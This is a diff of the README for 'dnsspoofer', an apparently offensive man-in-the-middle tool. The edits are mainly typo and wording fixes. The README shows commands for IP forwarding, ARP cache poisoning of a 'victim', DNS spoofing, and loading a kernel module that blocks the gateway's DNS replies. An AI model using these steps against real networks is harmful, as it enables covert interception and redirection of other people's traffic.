@@ -2,7 +2,8 @@
 ![implementation](https://img.shields.io/badge/python-3.4%2C%203.5%2C%203.6-blue.svg)
 ![versions](https://img.shields.io/badge/implementation-cpython-blue.svg)
 
-Work In Progress
+![Screenshot](screenshot.gif)
+
 ### About
 man in the middle attacks
 
@@ -17,8 +18,8 @@ man in the middle attacks
 * c++ compiler with c++11 support
 
 For the "firewall" module:
-* linux kernel >=4 (tested on 4.2, 4.6 and 4.9)  
-For older kernels you will probably have to change some functions signatures.
+* linux kernel >=4 (tested on 4.2, 4.4, 4.6 and 4.9)  
+For older kernels you will probably have to change some function signatures.
 ### Install
 
 ```bash
@@ -34,7 +35,7 @@ python setup.py install # You could also add directory build/lib... to the PYTHO
 ### Usage
 ```bash
 sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
-sudo python  # dnsspoofer requires root privileges
+sudo python3  # dnsspoofer requires root privileges
 ```
 #### ARP poisoning
 ```python
@@ -51,7 +52,7 @@ import dnsspoofer
 # victim:
 # 192.168.1.100   ether   01:02:03:04:05:06   C  em1
 dnsspoofer.spoof_arp(b"\x01\x02\x03\x04\x05\x06",b"192.168.1.1")
-# now arp -n output on the victim machine:
+# now arp -n output on the victim's machine:
 # 192.168.1.1     ether   33:33:33:33:33:33   C  em1
 
 # you probably also want to spoof the victim's (192.168.1.100)
@@ -64,13 +65,12 @@ see the [example.py](example.py) file
 
 I haven't implemented the reverse DNS lookups (.in-addr.arpa requests), but this works fine in most cases without them too.
 ##### Netfilter kernel module
-The DNS spoofing presented in example.py works, provided that you are faster than the gateway. This might not always be the case - for example the gateway might be caching the results. In this case the first time the victim tries to ping facebook.com everything might be working as expected, but the next time he asks about facebook.com the gateway will respond immediately. This can result in your response reaching the victim too late. This is super easy to notice in wireshark.
+The DNS spoofing presented in example.py works, provided that you are faster than the gateway. This might not always be the case - for example the gateway might be caching the results. In this case the first time the victim tries to ping facebook.com everything might be working as expected, but the next time he asks about facebook.com the gateway will respond immediately. This can result in your response reaching the victim too late. This is super easy to notice in Wireshark.
 
 The additional benefit of blocking gateway's reponses to the spoofed requests is that it is going to be harder to notice the spoofing going around form the victim's point of view.
 ##### Solution
 **!!!WARNING!!!  
-Badly writen kernel module can screw up your system. I recommend using for this a VM. Your mileage may vary.  
-!!!WARNING!!!**
+Badly written kernel module can screw up your system. I recommend using a VM for this. Your mileage may vary.**
 
 ```bash
 cd firewall
@@ -79,10 +79,10 @@ modinfo dnsfirewall.ko # show info about the module
 
 
 # load the module
-sudo insmod dnsfirewall.ko blocked_sites="wp.pl|facebook.com|youtube.com" gateway=192.168.1.1 victim=192.168.1.100
+sync && sudo insmod dnsfirewall.ko blocked_sites="wp.pl|facebook.com|youtube.com" gateway=192.168.1.1 victim=192.168.1.100
 # Module writes messages to SYSLOG with prefix 'DNS-SPOOFER'.
 
 
 # remove the module
-sudo rmmod dnsfirewall.ko
+sync && sudo rmmod dnsfirewall.ko
 ```
